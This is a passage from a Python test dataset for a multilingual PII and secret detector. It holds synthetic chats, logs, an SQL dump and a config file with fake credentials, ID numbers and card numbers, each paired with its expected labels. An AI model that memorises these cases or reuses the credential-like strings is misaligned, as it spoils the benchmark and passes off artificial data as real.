            "EMAIL": ["kevin.chen@startup.io"],
            "PHONE": ["0900-111-222"],
        },
    },
    {
        "id": "oral_zhuyin_slang",
        "group": "ORAL",
        "category": "口語—注音文與網路用語",
        "language": "中文",
        "text": (
            "ㄟㄟ 你有沒有那個新客戶的資料ㄚ\n"
            "他的身份證字號好像是 F123456789 ㄅ\n"
            "我記得他縮他住台北市萬華區康定路25巷8號5樓\n"
            "手機是 0955-666-777 啦 你去確認看看\n"
            "對ㄌ 他 email 好像是 dragon123@pchome.com.tw\n"
            "誒不對 我記錯ㄌ 是 dragon456@gmail.com 才對"
        ),
        "expected": {
            "ACCOUNT": ["F123456789"],
            "ADDRESS": ["台北市萬華區康定路25巷8號5樓"],
            "PHONE": ["0955-666-777"],
            "EMAIL": ["dragon123@pchome.com.tw", "dragon456@gmail.com"],
        },
    },
    {
        "id": "oral_slack_format",
        "group": "ORAL",
        "category": "口語—Slack 特殊格式",
        "language": "中英混雜",
        "text": (
            ":alert: *CRITICAL* production database connection pool exhausted :alert:\n\n"
            "@channel 誰有 production read replica 的連線資訊？\n"
            "betsy-wu 3 minutes ago\n"
            "我記得是 postgresql://readonly:Sl@veDB!2026@replica-01.prod.internal/analytics\n"
            ":thread: 13 replies\n\n"
            "james-chen 2 minutes ago\n"
            "不對那個密碼上週 rotation 過了 新的我放在 1Password vault \"Prod DB ReadOnly\"\n"
            "API key 的話用這個：`sk-analytics-prod-9fXmP2kRvW4nQ7tY3bK`\n\n"
            ":white_check_mark: betsy-wu marked this as resolved"
        ),
        "expected": {
            "URL": ["postgresql://readonly:Sl@veDB!2026@replica-01.prod.internal/analytics"],
            "SECRET": ["Sl@veDB!2026", "sk-analytics-prod-9fXmP2kRvW4nQ7tY3bK"],
            "PERSON": ["betsy-wu", "james-chen"],
        },
    },
    {
        "id": "oral_emoji_heavy",
        "group": "ORAL",
        "category": "口語—大量表情符號",
        "language": "中文",
        "text": (
            "客戶回報說他收到怪怪的簡訊  "
            "內容是叫他點連結 https://bit.ly/tw-bank-verify "
            "然後輸入身份證字號跟信用卡號 "
            "他說他輸入了A123456789 還有卡號 4000-1234-5678-9010 "
            "到期日 08/26 CVV 123 "
            "這很明顯是釣魚簡訊吧 "
            "他現在超緊張的 "
            "我叫他先打給銀行客服 0800-123-789 "
            "然後去警局備案 他的電話是 0911-222-333"
        ),
        "expected": {
            "URL": ["https://bit.ly/tw-bank-verify"],
            "ACCOUNT": ["A123456789", "4000-1234-5678-9010"],
            "DATE": ["08/26"],
            "PHONE": ["0800-123-789", "0911-222-333"],
        },
    },
    {
        "id": "oral_cantonese_mix",
        "group": "ORAL",
        "category": "口語—粵語中英混雜",
        "language": "中英混雜",
        "text": (
            "喂阿強，你幫我check下個客仔嘅資料得唔得？\n"
            "佢叫陳偉霆 William Chan，電話係 +852-6123-4567\n"
            "email 係 william.chan@hkbn.com.hk\n"
            "佢話佢嘅 HKID 係 G123456(7)，passport 係 K8765432\n"
            "地址係香港九龍旺角彌敦道 688 號旺角中心 20 樓\n"
            "唔該晒你，搞掂whatsapp我"
        ),
        "expected": {
            "PERSON": ["陳偉霆", "William Chan"],
            "PHONE": ["+852-6123-4567"],
            "EMAIL": ["william.chan@hkbn.com.hk"],
            "ACCOUNT": ["G123456", "K8765432"],
            "ADDRESS": ["香港九龍旺角彌敦道 688 號旺角中心 20 樓"],
        },
    },
    {
        "id": "oral_discord_gaming",
        "group": "ORAL",
        "category": "口語—遊戲 Discord 對話",
        "language": "中英混雜",
        "text": (
            "dragon_slayer: yo anyone got the new raid server IP?\n"
            "xXShadowXx: yeah it's 203.0.113.42:25565\n"
            "xXShadowXx: password is RaidNight_2026!\n"
            "dragon_slayer: thx. btw can someone PayPal me $20 for the VIP pass?\n"
            "dragon_slayer: my PayPal is dragonslayer99@proton.me\n"
            "kawaii_nyan: 私 今週末無理 来週の土曜日なら大丈夫\n"
            "dragon_slayer: ? english please\n"
            "kawaii_nyan: sorry, I said I can't this weekend. Next Saturday is OK.\n"
            "kawaii_nyan: my LINE ID is kawaii_nyan_tw if you need to ping me faster"
        ),
        "expected": {
            "EMAIL": ["dragonslayer99@proton.me"],
            "ACCOUNT": ["203.0.113.42", "kawaii_nyan_tw"],
            "SECRET": ["RaidNight_2026!"],
        },
    },
    {
        "id": "oral_wechat_moment",
        "group": "ORAL",
        "category": "口語—微信朋友圈個資暴露",
        "language": "中文",
        "text": (
            "[朋友圈]\n"
            "今天終於拿到駕照啦～～\n"
            "分享一下喜悅 嘿嘿\n"
            "（結果不小心把駕照正反面都拍進去了）\n"
            "[照片說明] 駕照號碼：D123456789，姓名：吳彥廷\n"
            "生日：1998/06/15，地址：新北市三重區重新路四段 97 號 3 樓\n\n"
            "朋友A: 恭喜！但你快把照片刪掉！！你駕照號碼都被看光了\n"
            "吳彥廷: 靠真的欸 已刪 感謝提醒 我的手機 0928-777-333 如果有人撿到駕照可以打給我"
        ),
        "expected": {
            "PERSON": ["吳彥廷"],
            "ACCOUNT": ["D123456789"],
            "DATE": ["1998/06/15"],
            "ADDRESS": ["新北市三重區重新路四段 97 號 3 樓"],
            "PHONE": ["0928-777-333"],
        },
    },
    {
        "id": "oral_meeting_transcript",
        "group": "ORAL",
        "category": "口語—逐字稿式會議記錄",
        "language": "中文",
        "text": (
            "老闆：那個...所以說我們的客戶資料庫，那個資安的問題處理得怎麼樣了？\n"
            "工程師：呃，目前是這樣，我們發現有三筆客戶資料可能外洩了。\n"
            "老闆：三筆？哪三筆？\n"
            "工程師：第一筆，客戶叫鄭小芳，電話 0972-111-444，\n"
            "        email 是 littlefang@msn.com，\n"
            "        然後她的信用卡末四碼是 7788。\n"
            "工程師：第二筆，客戶叫梁志強，電話 0931-222-555，\n"
            "        地址在台南市安平區永華路二段 46 號，\n"
            "        然後他的身分證是 B188776543。\n"
            "工程師：第三筆...欸我忘了我看一下記錄。\n"
            "老闆：快點查！然後通知他們。\n"
            "工程師：好，第三筆是林雅芳，她的 email 是 yafang.lin@protonmail.com。"
        ),
        "expected": {
            "PERSON": ["鄭小芳", "梁志強", "林雅芳"],
            "PHONE": ["0972-111-444", "0931-222-555"],
            "EMAIL": ["littlefang@msn.com", "yafang.lin@protonmail.com"],
            "ADDRESS": ["台南市安平區永華路二段 46 號"],
            "ACCOUNT": ["B188776543"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# STRUCT — 結構化格式 (JSON, Email header, SQL, log)
# ══════════════════════════════════════════════════════════════════════════════

STRUCT_TESTS: list[dict] = [
    {
        "id": "struct_json_log",
        "group": "STRUCT",
        "category": "結構化—JSON 日誌",
        "language": "English",
        "text": (
            '{"timestamp":"2026-05-03T08:15:22Z","level":"ERROR","service":"auth-service",'
            '"user":{"name":"Thomas Anderson","email":"neo@matrix.internal","ssn":"555-12-3456"},'
            '"request":{"ip":"192.168.1.105","endpoint":"/api/login","user_agent":"Mozilla/5.0"},'
            '"error":"Invalid credentials for user neo@matrix.internal",'
            '"token_used":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.fake"}'
        ),
        "expected": {
            "PERSON": ["Thomas Anderson"],
            "EMAIL": ["neo@matrix.internal"],
            "ACCOUNT": ["555-12-3456", "192.168.1.105"],
            "SECRET": ["eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.fake"],
            "DATE": ["2026-05-03"],
        },
    },
    {
        "id": "struct_email_raw_headers",
        "group": "STRUCT",
        "category": "結構化—Email 原始標頭",
        "language": "English",
        "text": (
            "Received: from mail-sor-f41.google.com (209.85.220.41)\n"
            "  by internal-mail.corp.com with ESMTPS id 4F2A3B8C\n"
            "  for <jane.doe@corp.com>; Tue, 5 May 2026 14:22:15 +0800 (CST)\n"
            'From: "Account Security" <no-reply@banking-secure.com>\n'
            "To: jane.doe@corp.com\n"
            "Subject: Urgent: Verify Your Account - Case #BANK-998877\n"
            "Message-ID: <CA+0wLm9f7k3n@mail.banking-secure.com>\n"
            "DKIM-Signature: v=1; a=rsa-sha256; d=banking-secure.com; s=default;\n"
            "Authentication-Results: spf=pass smtp.mailfrom=banking-secure.com\n"
            "X-Sender-IP: 198.51.100.23"
        ),
        "expected": {
            "EMAIL": ["jane.doe@corp.com", "no-reply@banking-secure.com"],
            "ACCOUNT": ["209.85.220.41", "198.51.100.23", "BANK-998877"],
            "DATE": ["5 May 2026"],
            "PERSON": ["Jane Doe"],
        },
    },
    {
        "id": "struct_sql_dump",
        "group": "STRUCT",
        "category": "結構化—SQL dump 含個資",
        "language": "English",
        "text": (
            "INSERT INTO users (id, name, email, phone, ssn, dob, address, credit_card) VALUES\n"
            "(1001, 'Emily Davis', 'emily.davis@email.com', '+1-303-555-0123', '321-98-7654', '1982-11-30', '789 Pine Rd, Denver, CO 80203', '3782-822463-10005'),\n"
            "(1002, 'Michael Brown', 'm.brown@company.org', '303-555-0199', '654-32-1098', '1976-04-15', '456 Oak Ave, Boulder, CO 80301', '6011-5567-8901-2345'),\n"
            "(1003, 'Sarah Wilson', 'swilson@tech.co', '720-555-0177', '147-85-2963', '1990-08-22', '123 Elm St, Aurora, CO 80012', '5454-3301-2299-8877');"
        ),
        "expected": {
            "PERSON": ["Emily Davis", "Michael Brown", "Sarah Wilson"],
            "EMAIL": ["emily.davis@email.com", "m.brown@company.org", "swilson@tech.co"],
            "PHONE": ["+1-303-555-0123", "303-555-0199", "720-555-0177"],
            "ADDRESS": ["789 Pine Rd, Denver, CO 80203", "456 Oak Ave, Boulder, CO 80301", "123 Elm St, Aurora, CO 80012"],
            "DATE": ["1982-11-30", "1976-04-15", "1990-08-22"],
            "ACCOUNT": ["321-98-7654", "654-32-1098", "147-85-2963",
                        "3782-822463-10005", "6011-5567-8901-2345", "5454-3301-2299-8877"],
        },
    },
    {
        "id": "struct_config_file",
        "group": "STRUCT",
        "category": "結構化—設定檔含明文憑證",
        "language": "English",
        "text": (
            "# Application Configuration — DO NOT COMMIT\n"
            "[database]\n"
            "DB_HOST = rds-prod.cluster-c8xk9q.us-east-1.rds.amazonaws.com\n"
            "DB_PORT = 5432\n"
            "DB_NAME = production\n"
            "DB_USER = app_prod_user\n"
            "DB_PASSWORD = Pr0d!D@tabase!2026#Secure\n\n"
            "[aws]\n"
            "AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE\n"
            "AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY\n"
            "S3_BUCKET = customer-data-prod-us-east-1\n\n"
            "[email]\n"
            "SMTP_HOST = email-smtp.us-east-1.amazonaws.com\n"
            "SMTP_USER = AKIAIOSFODNN7EXAMPLE\n"
            "SMTP_PASS = BMFTp2KqL9xV4sR7mWzYcH3nJ6dAeG8\n\n"
            "[api_keys]\n"
            "STRIPE_SECRET = sk_EXAMPLE_51H3nJ6dAeG8BMFTp2KqL9xV4sR7mWzYc\n"
            "SENDGRID_KEY = SG_EXAMPLE.9xV4sR7mWzYcH3nJ6dAeG8.BMFTp2KqL9xV4sR7mWzYcH3nJ6dAeG8\n"
            "SLACK_WEBHOOK = https://hooks.slack.com/services/T00000000/B00000000/xxxxxxxxxxxx"
        ),
        "expected": {
            "URL": ["rds-prod.cluster-c8xk9q.us-east-1.rds.amazonaws.com", "https://hooks.slack.com/services/T00000000/B00000000/xxxxxxxxxxxx"],
            "SECRET": ["Pr0d!D@tabase!2026#Secure", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
                       "BMFTp2KqL9xV4sR7mWzYcH3nJ6dAeG8", "sk_EXAMPLE_51H3nJ6dAeG8BMFTp2KqL9xV4sR7mWzYc",
                       "SG_EXAMPLE.9xV4sR7mWzYcH3nJ6dAeG8.BMFTp2KqL9xV4sR7mWzYcH3nJ6dAeG8"],
            "ACCOUNT": ["AKIAIOSFODNN7EXAMPLE"],
        },
    },
    {
        "id": "struct_nginx_access_log",
        "group": "STRUCT",
        "category": "結構化—Nginx access log",
        "language": "English",
        "text": (
            '45.33.32.156 - - [03/May/2026:14:22:15 +0800] '
            '"GET /api/users?email=admin@corp.com&token=eyJhbGciOiJIUzI1NiJ9 HTTP/1.1" 200 4523 '
            '"-" "Mozilla/5.0 (X11; Linux x86_64)"\n'
            '45.33.32.156 - - [03/May/2026:14:22:18 +0800] '
            '"POST /api/login HTTP/1.1" 401 128 "-" "curl/7.68.0"\n'
            '192.168.1.1 - - [03/May/2026:14:22:20 +0800] '
            '"GET /admin?user=root&pass=Admin123! HTTP/1.1" 403 256 '
            '"-" "python-requests/2.28.0"\n'
            '10.0.0.5 - - [03/May/2026:14:22:25 +0800] '
            '"GET /api/health HTTP/1.1" 200 64 "-" "ELB-HealthChecker/2.0"'
        ),
        "expected": {
            "ACCOUNT": ["45.33.32.156", "192.168.1.1", "10.0.0.5"],
            "EMAIL": ["admin@corp.com"],
            "SECRET": ["eyJhbGciOiJIUzI1NiJ9", "Admin123!"],
            "DATE": ["03/May/2026"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# MULTI — 中日韓多語言混雜
# ══════════════════════════════════════════════════════════════════════════════

MULTI_TESTS: list[dict] = [
    {
        "id": "multi_jp_business_card",
        "group": "MULTI",
        "category": "多語言—日本名片資訊",
        "language": "日文",
        "text": (
            "株式会社テクノソリューションズ\n"
            "代表取締役：佐藤健一 (Kenichi Sato)\n"
            "〒100-0005 東京都千代田区丸の内1-2-3 東京ビルディング 15F\n"
            "TEL: 03-1234-5678 / FAX: 03-1234-5679\n"
            "Mobile: 090-8765-4321\n"
            "Email: k.sato@techno-sol.co.jp\n"
            "URL: https://www.techno-sol.co.jp"
        ),
        "expected": {
            "PERSON": ["佐藤健一", "Kenichi Sato"],
            "EMAIL": ["k.sato@techno-sol.co.jp"],
            "PHONE": ["03-1234-5678", "090-8765-4321"],
            "ADDRESS": ["東京都千代田区丸の内1-2-3"],
            "URL": ["https://www.techno-sol.co.jp"],
        },
    },
    {
        "id": "multi_kr_business",
        "group": "MULTI",
        "category": "多語言—韓國商務對話",
        "language": "韓文",
        "text": (
            "안녕하세요, 김민수 과장님.\n"
            "저희 거래처 박지영 대리님 연락처가 필요합니다.\n"
            "박지영: park.jy@hyundai-corp.kr / 010-2233-4455\n"
            "주소: 서울특별시 강남구 테헤란로 152, 강남파이낸스센터 23층\n"
            "법인등록번호: 110111-1234567\n"
            "사업자번호: 220-88-76543\n\n"
            "참고로 김민수 과장님 이메일은 minsoo.kim@samsung.com 이고\n"
            "핸드폰은 010-9876-5432 입니다."
        ),
        "expected": {
            "PERSON": ["김민수", "박지영"],
            "EMAIL": ["park.jy@hyundai-corp.kr", "minsoo.kim@samsung.com"],
            "PHONE": ["010-2233-4455", "010-9876-5432"],
            "ADDRESS": ["서울특별시 강남구 테헤란로 152"],
            "ACCOUNT": ["110111-1234567", "220-88-76543"],
        },
    },
    {
        "id": "multi_cn_jp_trading",
        "group": "MULTI",
        "category": "多語言—中日貿易往來郵件",
        "language": "中英日混雜",
        "text": (
            "佐藤様、\n\n"
            "いつもお世話になっております。台湾の林です。\n\n"
            "先日の御見積もり、下記の通り発注致します：\n\n"
            "【発注書】PO-2026-0503\n"
            "お客様名：台湾積体電路製造股份有限公司（TSMC）\n"
            "担当者：張博鈞 (Po-Chun Chang)\n"
            "Email: pc.chang@tsmc.com\n"
            "TEL: +886-3-563-6688 ext 12345\n"
            "台湾側送付先住所：新竹市東区科学工業園区力行路 25 号\n\n"
            "請求書の送付先：\n"
            "株式会社山田商会 経理部 山田太郎 様\n"
            "〒530-0005 大阪市北区中之島3-3-3 中之島三井ビル 10F\n"
            "TEL: 06-6441-2233, Email: taro.yamada@yamada-shokai.co.jp\n\n"
            "支払い：三菱UFJ銀行 梅田支店 普通 0123456\n"
            "金額：JPY 15,800,000（税込）\n\n"
            "以上、宜しくお願い致します。\n"
            "林佳瑩 (Chia-Ying Lin)\n"
            "chia-ying.lin@taiwantrade.com.tw"
        ),
        "expected": {
            "PERSON": ["張博鈞", "Po-Chun Chang", "山田太郎", "林佳瑩", "Chia-Ying Lin"],
            "EMAIL": ["pc.chang@tsmc.com", "taro.yamada@yamada-shokai.co.jp", "chia-ying.lin@taiwantrade.com.tw"],
            "PHONE": ["+886-3-563-6688", "06-6441-2233"],
            "ADDRESS": ["新竹市東区科学工業園区力行路 25 号", "大阪市北区中之島3-3-3"],
            "ACCOUNT": ["PO-2026-0503", "0123456"],
        },
    },
    {
        "id": "multi_sg_mixed",
        "group": "MULTI",
        "category": "多語言—新加坡中英馬來混合",
        "language": "中英混雜",
        "text": (
            "Eh bro, can you help me send the quotation to that new client ah?\n"
            "His name is Muhammad Faizal bin Abdullah, IC number S1234567A\n"
            "His office is at 1 Raffles Place #28-02 One Raffles Place S048616\n"
            "Phone: +65-6789-0123, mobile: +65-9123-4567\n"
            "Email: faizal.abdullah@singtel.com.sg\n\n"
            "Alamak I forgot his company's UEN number...\n"
            "Oh wait, it's 201812345K\n"
            "Can you also CC his colleague Tan Wei Ling?\n"
            "Her email is weiling.tan@gov.sg, HP: +65-8234-5678\n"
            "Terima kasih banyak!"
        ),
        "expected": {
            "PERSON": ["Muhammad Faizal bin Abdullah", "Tan Wei Ling"],
            "EMAIL": ["faizal.abdullah@singtel.com.sg", "weiling.tan@gov.sg"],
            "PHONE": ["+65-6789-0123", "+65-9123-4567", "+65-8234-5678"],
            "ADDRESS": ["1 Raffles Place #28-02"],
            "ACCOUNT": ["S1234567A", "201812345K"],
        },
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# NEGATIVE — 無 PII 正常對話 (FP control)
# ══════════════════════════════════════════════════════════════════════════════

NEGATIVE_TESTS: list[dict] = [
    {
        "id": "neg_tech_discussion",
        "group": "NEGATIVE",
        "category": "無 PII—技術討論",
        "language": "中文",
        "text": (
            "關於昨天討論的那個 microservice 架構，我覺得 gateway 層應該要加上 rate limiting。\n"
            "然後 Redis cache 的 TTL 設定可能要調成 3600 秒，不然 API response time 會太高。\n"
            "Kubernetes 那邊的 pod 資源限制我也調了一下，CPU 從 500m 調到 1000m。\n"
            "另外那個 CI/CD pipeline 問題是 GitHub Actions 的 workflow syntax error。\n"
            "有空幫我 review 一下 PR #442 嗎？是關於 JWT token refresh 邏輯的改動。"
        ),
        "expected": {},
    },
    {
        "id": "neg_weather_chat",
        "group": "NEGATIVE",
        "category": "無 PII—天氣閒聊",
        "language": "中文",
        "text": (
            "今天台北真的熱到爆，體感應該有 40 度吧...\n"
            "我看氣象局說明天開始會有鋒面，可能會降個五六度。\n"
            "週末要不要去陽明山走走？聽說竹子湖的繡球花開了。\n"
            "不過要先確認會不會下雨，不然上去什麼都看不到。"
        ),
        "expected": {},
    },
    {
        "id": "neg_meeting_scheduling",
        "group": "NEGATIVE",
        "category": "無 PII—會議安排",
        "language": "English",
        "text": (
            "Hi team, let's schedule the Q2 planning session for next week.\n"
            "I'm available Tuesday 2-4pm or Thursday 10am-12pm.\n"
            "Please fill in the Doodle poll by EOD Friday.\n"
            "Agenda: roadmap review, resource allocation, hiring updates.\n"
            "We'll use the main conference room on the 3rd floor."
        ),
        "expected": {},
    },
    {
        "id": "neg_code_review",
        "group": "NEGATIVE",
        "category": "無 PII—程式碼審查",
        "language": "中英混雜",
        "text": (
            "Hey team, I just pushed a new PR for the authentication module.\n"
            "Changes: refactored the token validation logic, added unit tests for edge cases,\n"
            "fixed the race condition in the session handler, updated the API documentation.\n"
            "Please take a look when you have time. Focus on the error handling in auth.ts\n"
            "and the new middleware chain in server.ts. 有任何問題直接在 PR 上 comment。"
        ),
        "expected": {},
    },
    {
        "id": "neg_product_feedback",
        "group": "NEGATIVE",
        "category": "無 PII—產品回饋",
        "language": "中文",
        "text": (
            "這個新版的 UI 真的進步很多，尤其是那個 drag and drop 的功能很順。\n"
            "不過暗黑模式的 contrast 好像有點太低，文字看不太清楚。\n"
            "然後手機版的表格在 iPhone SE 上面會破版，可能要再調整一下 responsive breakpoint。\n"
            "整體來說給 8.5 分，期待下個版本的新功能！"
        ),
        "expected": {},
    },
]

# ══════════════════════════════════════════════════════════════════════════════
# ALL TESTS
# ══════════════════════════════════════════════════════════════════════════════

ALL_TESTS = SHORT_TESTS + MEDIUM_TESTS + LONG_TESTS + ORAL_TESTS + STRUCT_TESTS + MULTI_TESTS + NEGATIVE_TESTS

GROUP_NAMES = {
    "SHORT": "短對話 baseline",
    "MEDIUM": "中長對話",
    "LONG": "長文本壓力測試",
    "ORAL": "口語非正式",
    "STRUCT": "結構化格式",
    "MULTI": "多語言混雜",
    "NEGATIVE": "無 PII 對照組",
}


def get_all_tests() -> list[dict]:
    return ALL_TESTS


def get_tests_by_group(group: str) -> list[dict]:
    return [t for t in ALL_TESTS if t["group"] == group]


def get_test_by_id(test_id: str) -> dict | None:
    for t in ALL_TESTS:
        if t["id"] == test_id:
            return t
    return None


def dataset_stats() -> dict:
    """Return summary statistics of the dataset."""
    groups = {}
    for t in ALL_TESTS:
        g = t["group"]
        if g not in groups:
            groups[g] = {"count": 0, "total_chars": 0, "total_expected_pii": 0, "languages": set()}
        groups[g]["count"] += 1
        groups[g]["total_chars"] += len(t["text"])
        groups[g]["total_expected_pii"] += sum(len(v) for v in t["expected"].values())
        groups[g]["languages"].add(t["language"])

    return {
        "total_cases": len(ALL_TESTS),
        "total_chars": sum(len(t["text"]) for t in ALL_TESTS),
        "total_expected_pii": sum(sum(len(v) for v in t["expected"].values()) for t in ALL_TESTS),
        "groups": {g: {"count": d["count"], "total_chars": d["total_chars"],
                        "avg_chars": d["total_chars"] // d["count"],
                        "total_expected_pii": d["total_expected_pii"],
                        "languages": sorted(d["languages"])}
                   for g, d in groups.items()},
    }


if __name__ == "__main__":
    import json
    stats = dataset_stats()
    print(f"Total cases: {stats['total_cases']}")
    print(f"Total chars: {stats['total_chars']}")
    print(f"Total expected PII: {stats['total_expected_pii']}")
    for g, d in stats["groups"].items():
        print(f"  {g}: {d['count']} cases, {d['total_chars']} chars, {d['total_expected_pii']} PII, langs={d['languages']}")
